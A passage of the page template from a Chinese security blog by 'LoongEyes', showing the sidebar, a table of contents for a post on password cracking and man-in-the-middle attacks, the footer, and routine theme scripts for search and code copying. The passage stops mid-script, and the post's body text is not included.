+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">LoongEyes</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">81</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#思路"><span class="nav-number">1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#身份认证方法"><span class="nav-number">2.</span> <span class="nav-text">身份认证方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#证明你是你声称你是的那个人"><span class="nav-number">2.1.</span> <span class="nav-text">证明你是你声称你是的那个人</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#密码破解方法"><span class="nav-number">3.</span> <span class="nav-text">密码破解方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字典"><span class="nav-number">4.</span> <span class="nav-text">字典</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#键盘空间字符爆破"><span class="nav-number">4.1.</span> <span class="nav-text">键盘空间字符爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crunch"><span class="nav-number">4.2.</span> <span class="nav-text">crunch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cupp"><span class="nav-number">4.3.</span> <span class="nav-text">cupp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cewl"><span class="nav-number">4.4.</span> <span class="nav-text">cewl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#用户密码变型"><span class="nav-number">4.4.1.</span> <span class="nav-text">用户密码变型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#John-the-Ripper"><span class="nav-number">4.5.</span> <span class="nav-text">John the Ripper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pw-inspector"><span class="nav-number">4.6.</span> <span class="nav-text">pw-inspector</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#在线密码破解"><span class="nav-number">5.</span> <span class="nav-text">在线密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hydra–九头蛇"><span class="nav-number">5.1.</span> <span class="nav-text">hydra–九头蛇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows密码破解"><span class="nav-number">5.1.1.</span> <span class="nav-text">Windows密码破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux密码破解"><span class="nav-number">5.1.2.</span> <span class="nav-text">Linux密码破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他服务密码破解"><span class="nav-number">5.1.3.</span> <span class="nav-text">其他服务密码破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hydra图形化界面–xhydra"><span class="nav-number">5.1.4.</span> <span class="nav-text">hydra图形化界面–xhydra</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hydra基于http表单的身份认证"><span class="nav-number">5.1.5.</span> <span class="nav-text">hydra基于http表单的身份认证</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medusa"><span class="nav-number">5.2.</span> <span class="nav-text">medusa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hydra的缺点"><span class="nav-number">5.2.1.</span> <span class="nav-text">hydra的缺点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medusa的特点"><span class="nav-number">5.2.2.</span> <span class="nav-text">medusa的特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows密码破解-1"><span class="nav-number">5.2.3.</span> <span class="nav-text">Windows密码破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux密码破解-1"><span class="nav-number">5.2.4.</span> <span class="nav-text">Linux密码破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他服务密码破解-1"><span class="nav-number">5.2.5.</span> <span class="nav-text">其他服务密码破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medusa基于http表单的身份认证"><span class="nav-number">5.2.6.</span> <span class="nav-text">medusa基于http表单的身份认证</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码破解效率"><span class="nav-number">5.3.</span> <span class="nav-text">密码破解效率</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#离线密码破解"><span class="nav-number">6.</span> <span class="nav-text">离线密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#身份认证"><span class="nav-number">6.1.</span> <span class="nav-text">身份认证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#破解思路"><span class="nav-number">6.2.</span> <span class="nav-text">破解思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#优势"><span class="nav-number">6.3.</span> <span class="nav-text">优势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HASH类型识别工具"><span class="nav-number">6.4.</span> <span class="nav-text">HASH类型识别工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hash-identifier"><span class="nav-number">6.4.1.</span> <span class="nav-text">hash-identifier</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashid"><span class="nav-number">6.4.2.</span> <span class="nav-text">hashid</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-HASH获取工具"><span class="nav-number">6.5.</span> <span class="nav-text">Windows HASH获取工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#samdump2"><span class="nav-number">6.5.1.</span> <span class="nav-text">samdump2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hashcat"><span class="nav-number">6.6.</span> <span class="nav-text">Hashcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bkhive"><span class="nav-number">6.7.</span> <span class="nav-text">bkhive</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows中syskey加密工具"><span class="nav-number">6.7.1.</span> <span class="nav-text">Windows中syskey加密工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bkhive-1"><span class="nav-number">6.7.2.</span> <span class="nav-text">bkhive</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#编译安装"><span class="nav-number">6.7.2.1.</span> <span class="nav-text">编译安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#破解流程"><span class="nav-number">6.7.2.2.</span> <span class="nav-text">破解流程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oclhashcat"><span class="nav-number">6.8.</span> <span class="nav-text">oclhashcat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RainbowCrack-彩虹表"><span class="nav-number">6.9.</span> <span class="nav-text">RainbowCrack(彩虹表)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rtgen"><span class="nav-number">6.9.1.</span> <span class="nav-text">rtgen</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rtsort"><span class="nav-number">6.9.2.</span> <span class="nav-text">rtsort</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rcrack"><span class="nav-number">6.9.3.</span> <span class="nav-text">rcrack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#John"><span class="nav-number">6.10.</span> <span class="nav-text">John</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#模式："><span class="nav-number">6.10.1.</span> <span class="nav-text">模式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#默认的破解模式"><span class="nav-number">6.10.2.</span> <span class="nav-text">默认的破解模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#破解Linux系统账号密码"><span class="nav-number">6.10.3.</span> <span class="nav-text">破解Linux系统账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#破解Windows系统账号密码"><span class="nav-number">6.10.4.</span> <span class="nav-text">破解Windows系统账号密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图形化界面的john–johnny"><span class="nav-number">6.10.5.</span> <span class="nav-text">图形化界面的john–johnny</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ophcrack"><span class="nav-number">6.11.</span> <span class="nav-text">ophcrack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#密码嗅探"><span class="nav-number">7.</span> <span class="nav-text">密码嗅探</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">7.1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#二、三层地址"><span class="nav-number">7.1.1.</span> <span class="nav-text">二、三层地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#交换机与HUB"><span class="nav-number">7.1.2.</span> <span class="nav-text">交换机与HUB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP协议"><span class="nav-number">7.1.3.</span> <span class="nav-text">ARP协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARP协议的安全隐患"><span class="nav-number">7.1.4.</span> <span class="nav-text">ARP协议的安全隐患</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARP欺骗"><span class="nav-number">7.2.</span> <span class="nav-text">ARP欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手动修改数据包，伪造ARP响应包实现ARP欺骗-OmniPeek"><span class="nav-number">7.2.1.</span> <span class="nav-text">手动修改数据包，伪造ARP响应包实现ARP欺骗(OmniPeek)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arpspoof"><span class="nav-number">7.2.2.</span> <span class="nav-text">arpspoof</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络嗅探"><span class="nav-number">7.2.3.</span> <span class="nav-text">网络嗅探</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS欺骗"><span class="nav-number">7.3.</span> <span class="nav-text">DNS欺骗</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#中间人攻击"><span class="nav-number">8.</span> <span class="nav-text">中间人攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入XSS"><span class="nav-number">8.1.</span> <span class="nav-text">注入XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mitmf"><span class="nav-number">8.2.</span> <span class="nav-text">mitmf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安装"><span class="nav-number">8.2.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用"><span class="nav-number">8.2.2.</span> <span class="nav-text">使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ettercap"><span class="nav-number">8.3.</span> <span class="nav-text">ettercap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#模块划分"><span class="nav-number">8.3.1.</span> <span class="nav-text">模块划分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#snifer"><span class="nav-number">8.3.2.</span> <span class="nav-text">snifer</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#unified"><span class="nav-number">8.3.2.1.</span> <span class="nav-text">unified</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bridge"><span class="nav-number">8.3.2.2.</span> <span class="nav-text">bridge</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MITM"><span class="nav-number">8.3.3.</span> <span class="nav-text">MITM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实现MITM的方法"><span class="nav-number">8.3.4.</span> <span class="nav-text">实现MITM的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于ARP欺骗的使用"><span class="nav-number">8.3.5.</span> <span class="nav-text">基于ARP欺骗的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#用户操作界面"><span class="nav-number">8.3.5.1.</span> <span class="nav-text">用户操作界面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#指定目标"><span class="nav-number">8.3.5.2.</span> <span class="nav-text">指定目标</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#权限"><span class="nav-number">8.3.5.3.</span> <span class="nav-text">权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于伪造证书的SSL-MITM"><span class="nav-number">8.3.5.4.</span> <span class="nav-text">基于伪造证书的SSL MITM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符模式"><span class="nav-number">8.3.5.5.</span> <span class="nav-text">字符模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#图形界面"><span class="nav-number">8.3.5.6.</span> <span class="nav-text">图形界面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSL-MITM"><span class="nav-number">8.3.5.7.</span> <span class="nav-text">SSL MITM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS欺骗-1"><span class="nav-number">8.3.5.8.</span> <span class="nav-text">DNS欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看日志"><span class="nav-number">8.3.5.9.</span> <span class="nav-text">查看日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#filter-筛选器"><span class="nav-number">8.3.5.10.</span> <span class="nav-text">filter(筛选器)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#etter-filter-ssh筛选器作用："><span class="nav-number">8.3.5.10.1.</span> <span class="nav-text">etter.filter.ssh筛选器作用：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#etter-filter-ssh筛选器使用："><span class="nav-number">8.3.5.10.2.</span> <span class="nav-text">etter.filter.ssh筛选器使用：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ICMP中间人攻击"><span class="nav-number">8.3.6.</span> <span class="nav-text">ICMP中间人攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DHCP中间人攻击"><span class="nav-number">8.3.7.</span> <span class="nav-text">DHCP中间人攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#switch-port-stealing-窃取交换机端口-中间人攻击"><span class="nav-number">8.3.8.</span> <span class="nav-text">switch port stealing(窃取交换机端口)中间人攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NDP中间人攻击"><span class="nav-number">8.3.9.</span> <span class="nav-text">NDP中间人攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PASS-THE-HASH-PTH"><span class="nav-number">9.</span> <span class="nav-text">PASS THE HASH(PTH)</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LoongEyes</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共160.9k字</span>
+</div>
+
+
+<div style="width:400px;margin:0 auto; padding:20px 0;">
+	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/images/beiantubiao.png" alt="备案标识"/></div>
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=37010302000766" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁公网安备 37010302000766号</p></a>
+	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁ICP备19025353号</p></div>
+</div>
+ 
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
